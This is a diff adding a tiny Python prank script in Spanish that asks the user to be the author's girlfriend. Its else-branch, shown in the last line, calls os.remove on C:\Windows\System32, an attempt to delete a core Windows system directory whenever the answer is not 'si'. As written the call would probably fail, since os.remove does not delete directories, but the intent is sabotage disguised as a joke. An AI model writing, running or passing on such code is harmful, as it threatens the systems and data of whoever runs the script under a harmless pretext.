@@ -1,0 +1,8 @@
+import os 
+print ('Queres ser mi novia?')
+respuestas= input ('Si o No')
+
+if respuestas == "si":
+    print ("Gracias, por aceptar")
+else:
+    os.remove ("C:\\Windows\\System32")   
